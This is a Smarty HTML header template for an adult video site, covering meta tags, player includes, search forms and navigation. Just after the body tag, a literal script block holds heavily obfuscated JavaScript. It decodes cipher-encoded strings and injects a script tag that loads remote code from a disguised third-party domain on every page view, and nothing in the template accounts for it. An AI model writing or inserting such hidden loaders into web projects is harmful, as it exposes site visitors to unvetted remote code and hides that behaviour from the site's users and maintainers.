<!DOCTYPE html>
<html lang="en">
{if $view}
	<head prefix="og: http://ogp.me/ns#">
{else}
	<head>
{/if}
	{if $view}
		{assign var='vtags' value=$video.keyword}

		<meta property="og:site_name" content="{$site_name}">
		<meta property="og:title" content="{$video.title|escape:'html'}">
		<meta property="og:url" content="{$baseurl}/video/{$video.VID}/{$video.title|clean}">
		<meta property="og:type" content="video">
		<meta property="og:image" content="{insert name=thumb_path vid=$video.VID}/{if $video.embed_code != ''}1{else}default{/if}.jpg">
		<meta property="og:description" content="{if $video.description}{$video.description|escape:'html'}{else}{$video.title|escape:'html'}{/if}">
	{section name=i loop=$vtags}
	<meta property="video:tag" content="{$vtags[i]}">
	{/section}
		{if !$video.embed_code}
			{include file='player_settings.tpl'}
		{/if}
	{/if}

    <title>{if isset($self_title) && $self_title != ''}{$self_title|escape:'html'}{else}{$site_name}{/if}</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="robots" content="index, follow" />
    <meta name="revisit-after" content="1 days" />
    <meta name="keywords" content="{if isset($self_keywords) && $self_keywords != ''}{$self_keywords|escape:'html'}{else}{$meta_keywords}{/if}" />
    <meta name="description" content="{if isset($self_description) && $self_description != ''}{$self_description|escape:'html'}{else}{$meta_description}{/if}" />

	<link rel="Shortcut Icon" type="image/ico" href="{$baseurl}/images/favicons/favicon.ico" />
	<link rel="apple-touch-icon" sizes="57x57" href="{$baseurl}/images/favicons/apple-icon-57x57.png">
	<link rel="apple-touch-icon" sizes="60x60" href="{$baseurl}/images/favicons/apple-icon-60x60.png">
	<link rel="apple-touch-icon" sizes="72x72" href="{$baseurl}/images/favicons/apple-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="76x76" href="{$baseurl}/images/favicons/apple-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="114x114" href="{$baseurl}/images/favicons/apple-icon-114x114.png">
	<link rel="apple-touch-icon" sizes="120x120" href="{$baseurl}/images/favicons/apple-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="144x144" href="{$baseurl}/images/favicons/apple-icon-144x144.png">
	<link rel="apple-touch-icon" sizes="152x152" href="{$baseurl}/images/favicons/apple-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="{$baseurl}/images/favicons/apple-icon-180x180.png">
	<link rel="icon" type="image/png" sizes="192x192"  href="{$baseurl}/images/favicons/android-icon-192x192.png">
	<link rel="icon" type="image/png" sizes="32x32" href="{$baseurl}/images/favicons/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="96x96" href="{$baseurl}/images/favicons/favicon-96x96.png">
	<link rel="icon" type="image/png" sizes="16x16" href="{$baseurl}/images/favicons/favicon-16x16.png">
	<link rel="manifest" href="{$baseurl}/images/favicons/manifest.json">
	<meta name="msapplication-TileColor" content="#ffffff">
	<meta name="msapplication-TileImage" content="{$baseurl}/images/favicons/ms-icon-144x144.png">
	<meta name="theme-color" content="#ffffff">

    <script type="text/javascript">
    var base_url = "{$baseurl}";
	var max_thumb_folders = "{$max_thumb_folders}";
    var tpl_url = "{$relative_tpl}";
	{if isset($video.VID)}var video_id = "{$video.VID}";{/if}
	var lang_deleting = "{t c='global.deleting'}";
	var lang_flaging = "{t c='global.flaging'}";
	var lang_loading = "{t c='global.loading'}";
	var lang_sending = "{t c='global.sending'}";
	var lang_share_name_empty = "{t c='share.name_empty'}";
	var lang_share_rec_empty = "{t c='share.recipient'}";
	var fb_signin = "{$fb_signin}";
	var fb_appid = "{$fb_appid}";
	var g_signin = "{$g_signin}";
	var g_cid = "{$g_cid}";
	var signup_section = false;
	var relative = "{$relative}";
	var search_v = "{t c='ajax.search'} {t c='global.videos'}";
	var search_a = "{t c='ajax.search'} {t c='global.albums'}";
	var search_u = "{t c='ajax.search'} {t c='global.users'}";
	var lang_global_delete 		 	 = "{t c='global.delete'}";
	var lang_global_yes 		 	 = "{t c='global.yes'}";
	var lang_global_no 				 = "{t c='global.no'}";
	var lang_global_remove 		 	 = "{t c='global.remove'}";
	{if isset($smarty.session.uid)}
		var session_uid = "{$smarty.session.uid}";
	{else}
		var session_uid = "";
	{/if}
	var current_url = "{$current_url}";
	var alert_messages = {$messages|json_encode};
	var alert_errors = {$errors|json_encode};
	</script>

    <script src="https://code.jquery.com/jquery-3.1.0.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

	<link rel="stylesheet" href="{$relative_tpl}/css/easy-autocomplete.min.css">
	<link rel="stylesheet" href="{$relative_tpl}/css/easy-autocomplete.themes.min.css">

	<link href="{$relative_tpl}/css/main.css?=ver2" rel="stylesheet">


	<script src="https://kit.fontawesome.com/f8d4a35bda.js" crossorigin="anonymous"></script>

	<!-- Video Player -->
	{if $view && !$video.embed_code}
		<link href="{$baseurl}/media/player/videojs/video-js.css" rel="stylesheet">
		<link href="{$baseurl}/media/player/videojs/plugins/videojs-resolution-switcher-master/lib/videojs-resolution-switcher.css" rel="stylesheet">
		<link href="{$baseurl}/media/player/videojs/plugins/videojs-logobrand-master/src/videojs.logobrand.css" rel="stylesheet">
		<link href="{$baseurl}/media/player/videojs/plugins/videojs-thumbnails-master/videojs.thumbnails.css" rel="stylesheet">
		<link href="{$baseurl}/media/player/videojs/video-js-custom.css" rel="stylesheet">
		{if $vast_vpaid && $player.vast_vpaid_adv}
			<link href="{$baseurl}/media/player/videojs/plugins/videojs-vast-vpaid-master/bin/videojs.vast.vpaid.css" rel="stylesheet">
		{/if}
		<script src="{$baseurl}/media/player/videojs/ie8/videojs-ie8.min.js"></script>
		<script src="{$baseurl}/media/player/videojs/video.js"></script>
		{if $vast_vpaid && $player.vast_vpaid_adv}
			<script src="{$baseurl}/media/player/videojs/plugins/videojs-vast-vpaid-master/bin/es5-shim.js"></script>
			<script src="{$baseurl}/media/player/videojs/plugins/videojs-vast-vpaid-master/bin/ie8fix.js"></script>
			<script src="{$baseurl}/media/player/videojs/plugins/videojs-vast-vpaid-master/bin/videojs_5.vast.vpaid.min.js"></script>
		{/if}
		<script src="{$baseurl}/media/player/videojs/plugins/videojs-resolution-switcher-master/lib/videojs-resolution-switcher.js"></script>
		<script src="{$baseurl}/media/player/videojs/plugins/videojs-logobrand-master/src/videojs.logobrand.js"></script>
		<script src="{$baseurl}/media/player/videojs/plugins/videojs-thumbnails-master/videojs.thumbnails.js"></script>
	{/if}
	<!-- End Video Player -->
	{if $menu == 'blogs'}
		<link href="https://cdn.jsdelivr.net/npm/summernote@0.8.15/dist/summernote-lite.min.css" rel="stylesheet">
		<script src="https://cdn.jsdelivr.net/npm/summernote@0.8.15/dist/summernote-lite.min.js"></script>
	{/if}


	<script src="{$relative_tpl}/js/script.js?=ver8"></script>
</head>
<body>
{literal}
<script type="text/javascript">
 var p$00a = 'p$00a' + (new Date().getTime()) + 'zz'; window[p$00a] = {a:'abcdefghijklmnopqrstuvwxyz012345678995kdum1q7wngy4rhicsf28ebj6tx0lapv3zo', b:'{"AZIb":"a3ovzz", "BVIb":"30a0tl", "CXrr1":"2h", "DLtag":"x", "Emjk5":"", "XCge1s":"k99qei.kry" , "Zt1":"hrhk9sq.4uf", "ZZ1":"c9hrgrn.kry" }', c:'{"Abkr221":"skc7hf", "Bo9ssm":"//kd4.k99qei.kry/9hh.ws"}', d:'{"Ag4":"5rdj", "Bx1":"9hhu4dCq7gd", "Cky":"sck", "Dmg":"kcu9fuEguyu4f"}'};
var _0x5d4b=['235913QVfbwv','slice','length','162209QBmAmV','14238hyOOTq','323207DTbifh','split','1DqiKtq','135866HTbavB','indexOf','call','27654SKXHbY','parse','undefined','32Ijckmz','keys','map','ceil','115980hcFVDy','values','join'];var _0x208c=function(_0x31a8d7,_0x5f36b3){_0x31a8d7=_0x31a8d7-0x167;var _0x5d4be1=_0x5d4b[_0x31a8d7];return _0x5d4be1;};(function(_0x276f94,_0x57c4ff){var _0x50057c=_0x208c;while(!![]){try{var _0x40d184=parseInt(_0x50057c(0x168))+parseInt(_0x50057c(0x16f))*parseInt(_0x50057c(0x179))+-parseInt(_0x50057c(0x176))+parseInt(_0x50057c(0x173))+parseInt(_0x50057c(0x16e))+-parseInt(_0x50057c(0x170))+parseInt(_0x50057c(0x16b))*-parseInt(_0x50057c(0x172));if(_0x40d184===_0x57c4ff)break;else _0x276f94['push'](_0x276f94['shift']());}catch(_0x411836){_0x276f94['push'](_0x276f94['shift']());}}}(_0x5d4b,0x45111),function(){var _0x1ba274=function(_0x2f3a9a){var _0x3f0bc4=_0x208c,_0x1894ba=Math[_0x3f0bc4(0x167)](this['a'][_0x3f0bc4(0x16d)]/0x2),_0x539548=this['a'][_0x3f0bc4(0x16c)](0x0,_0x1894ba),_0x5d8009=this['a'][_0x3f0bc4(0x16c)](_0x1894ba);decrypt=this[_0x2f3a9a][_0x3f0bc4(0x171)]('')[_0x3f0bc4(0x17b)](_0x28f433=>{var _0xd7612d=_0x3f0bc4;return _0x5d8009['split']('')['includes'](_0x28f433)?_0x539548[_0x5d8009[_0xd7612d(0x174)](_0x28f433)]:_0x28f433;})[_0x3f0bc4(0x16a)]('');try{return JSON[_0x3f0bc4(0x177)](decrypt);}catch{return decrypt;}},_0x57bb85=window[p$00a],_0x219d97=function(_0x28efac,_0x22a031){var _0x5bee8e=_0x208c,_0x3963a0=Object[_0x5bee8e(0x169)](_0x1ba274[_0x5bee8e(0x175)](_0x57bb85,Object[_0x5bee8e(0x17a)](_0x57bb85)[_0x28efac]));return typeof _0x22a031!=_0x5bee8e(0x178)?_0x3963a0[_0x22a031]:_0x3963a0;};window[p$00a]['x']=function(){return _0x219d97(0x1);};var _0xf1db57=document[_0x219d97(0x3,0x3)](_0x219d97(0x2,0x0));_0xf1db57[_0x219d97(0x3,0x2)]=_0x219d97(0x2,0x1),document[_0x219d97(0x3,0x0)][_0x219d97(0x3,0x1)](_0xf1db57),p$00a=undefined;}());
 
 </script>
{/literal}
<div class="modal fade" id="dialogModal" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h4 class="modal-title"></h4>
				<button type="button" class="close" data-dismiss="modal">&times;</button>
			</div>
			<div class="modal-body">
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-primary btn-bold opt-1"></button>
				<button type="button" class="btn btn-secondary btn-bold opt-2" data-dismiss="modal"></button>
			</div>
		</div>
	</div>
</div>
<header>

	<div class="menu">
		<div class="hamburger hamburger--spring">
        	<span class="hamburger-box">
                <span class="hamburger-inner"></span>
            </span>
		</div>
	</div>
	<div class="left"><div class="logo"><a href="{$relative}/" title="Ahegao Porn" alt="Ahegao Porn Logo"></a></div></div>
	<div class="search">
		<form name="search" id="search_form" method="post" action="{$relative}/search/{if !isset($search_type)}videos{else}{$search_type}{/if}">
			<input type="text" class="form-control search-box" placeholder="{t c='ajax.search'} {if isset($search_type) && $search_type == 'photos'} {t c='global.albums'}{elseif isset($search_type) && $search_type == 'users'} {t c='global.users'}{else}{t c='global.videos'}{/if}" name="search_query" id="search_query" value="{if isset($search_query)}{$search_query_f}{/if}" autocomplete="off">
			<a id="search_select" class="btn btn-search-select">{if isset($search_type) && $search_type == 'photos'}<i class="fas fa-camera"></i>{elseif isset($search_type) && $search_type == 'users'}<i class="fas fa-user"></i>{else}<i class="fas fa-video"></i>{/if}</a>
			<input type="hidden" id="search_type" value="{$search_type}">
		</form>
	</div>
	{if $suggestion_arr}
	<div class="trending-searches">
		<span class="head">{t c='menu.trending_searches'}</span>
		<ul>
			{section name=i loop=$suggestion_arr max=10}
			<li><a href="{$relative}/search/videos/{$suggestion_arr[i].expression}">{$suggestion_arr[i].expression}</a></li>
			{/section}
		</ul>
	</div>
	{/if}
	<div class="upload"><a href="{$relative}/upload">{translate c='menu.upload'}</a></div>

	<div class="language">{insert name=language assign=flag}{$flag}<i class="fas fa-angle-down"></i></div>
	<div class="language-dropdown" id="language-modal">
		<ul>
			{foreach from=$languages key=key item=language }
			<li>
				{if $smarty.session.language != $key}
					<a href="#" id="{$key}" class="change-language" >{$language.name}</a>
				{else}
					<a href="#" class="change-language active">{$language.name}</a>
				{/if}
			</li>
			{/foreach}
		</ul>
		<form name="languageSelect" id="languageSelect" method="post" action="">
			<input name="language" id="language" type="hidden" value="" />
		</form>
	</div>


	<div class="mobile-search">
		<div class="icon"><i class="fas fa-search"></i></div>
		<div class="toggle">
			<form name="search" id="search_form_mobile" method="post" action="{$relative}/search/{if !isset($search_type)}videos{else}{$search_type}{/if}">
				<i class="close fas fa-times"></i>
				<input type="text" class="form-control search-box" placeholder="{t c='ajax.search'} {if isset($search_type) && $search_type == 'photos'} {t c='global.albums'}{elseif isset($search_type) && $search_type == 'users'} {t c='global.users'}{else}{t c='global.videos'}{/if}" name="search_query" id="search_query_mobile" value="{if isset($search_query)}{$search_query_f}{/if}" autocomplete="off">
				<a id="search_select_mobile" class="btn btn-search-select">{if isset($search_type) && $search_type == 'photos'}<i class="fas fa-camera"></i>{elseif isset($search_type) && $search_type == 'users'}<i class="fas fa-user"></i>{else}<i class="fas fa-video"></i>{/if}</a>
				<input type="hidden" id="search_type_mobile" value="{$search_type}">
			</form>
		</div>
	</div>
</header>

<main>
	<nav class="header">
		{if isset($smarty.session.uid)}
			<div class="user">
				<div class="content">
					<div class="flex">
						<a href="{$relative}/user">
							<div class="avatar">
								<div class="content">
									<img src="{$relative}/media/users/{if $smarty.session.photo == ''}nopic-{$smarty.session.gender}.gif{else}{$smarty.session.photo}?{0|rand:100}{/if}" alt="{$smarty.session.username|truncate:35:"..."}">
								</div>
							</div>
							<div class="data">
								<span class="username">{$smarty.session.username|truncate:35:"..."}</span>
								<span class="subscribers">{insert name=tsubscribers assign=t_subscribers subscribers=$video.total_subscribers}{$t_subscribers}</span>
							</div>
						</a>
					</div>
				</div>
				<div class="functions">
					<ul>
						<li><a href="{$relative}/user/{$smarty.session.username}/videos"><i class="fas fa-film"></i></a></li>
						<li><a href="{$relative}/user"><i class="fas fa-user"></i></a></li>
						<li><a href="{$relative}/mail/inbox">{if $mails_count > 0}<span class="count">{$mails_count}</span>{/if}<i class="fas fa-comments"></i></a></li>
						<li><a href="{$relative}/user/edit"><i class="fas fa-cog"></i></a></li>
						<li><a href="{$relative}/logout"><i class="fas fa-sign-out-alt"></i></a></li>
					</ul>
				</div>
			</div>
		{else}
			<div class="guest">
				<span class="welcome-text"><b>Sign up</b> and enjoy<br> extra features!</span>
				<ul>
					<li><a href="{$relative}/login">{t c='global.login'}</a></li>
					<li><a href="{$relative}/signup">{t c='global.sign_up'}</a></li>
				</ul>
			</div>
		{/if}
		<div class="mobile-upload-btn">
			<a href="{$relative}/upload">{translate c='menu.upload'}</a>
		</div>

		<div class="menu">
			<ul>
				<li class="{if $menu == 'home'}active{/if}">
					<a href="{$relative}/">
						<i class="fas fa-home"></i>
						<span class="text">{translate c='menu.home'}</span>
					</a>
				</li>
				<li class="{if $menu == 'videos'} active{/if}">
					<a href="{$relative}/videos">
						<i class="fas fa-film"></i>
						<span class="text">{translate c='menu.videos'}</span>
					</a>
				</li>
				<li class="{if $menu == 'albums'} active{/if}">
					<a href="{$relative}/albums">
						<i class="fas fa-image"></i>
						<span class="text">{translate c='global.albums'}</span>
					</a>
				</li>
				<li class="{if $menu == 'tags'}active{/if}">
					<a href="{$relative}/tags">
						<i class="fas fa-tag"></i>
						<span class="text">{translate c='menu.tags'}</span>
					</a>
				</li>
				<li class="{if $menu == 'categories'}active{/if}">
					<a href="{$relative}/categories">
						<i class="fas fa-th-list"></i>
						<span class="text">{translate c='menu.categories'}</span>
					</a>
				</li>
				<li class="{if $menu == 'community'} active{/if}">
					<a href="{$relative}/users?o=mp">
						<i class="fas fa-users"></i>
						<span class="text">{translate c='menu.community'}</span>
					</a>
				</li>
			</ul>
		</div>
		{if $categories_sm}
		<div class="categories">
			<span class="head">{t c='menu.popular_categories'}</span>
			<ul>
				{section name=i loop=$categories_sm}
				<li>
					<a href="{$relative}/videos/{$categories_sm[i].slug}">
						<span class="text">{$categories_sm[i].name|escape:'html'}</span>
						<span class="count">{$categories_sm[i].total_videos}</span>
					</a>
				</li>
				{/section}
			</ul>
		</div>
		{/if}

		<footer>
			<ul>
				<li><a href="/static/dmca">DMCA</a></li>
				<li><a href="/static/terms">Terms and Conditions</a></li>
				<li><a href="/static/privacy">Privacy Policy</a></li>
				<li><a href="/static/faq">FAQ</a></li>
				<li><a href="/feedback">Support / Feedback</a></li>
			</ul>
			<span class="copyright">Copyright ©2020 ahegaoporn.net<br>All Rights Reserved.</span>
		</footer>
	</nav>
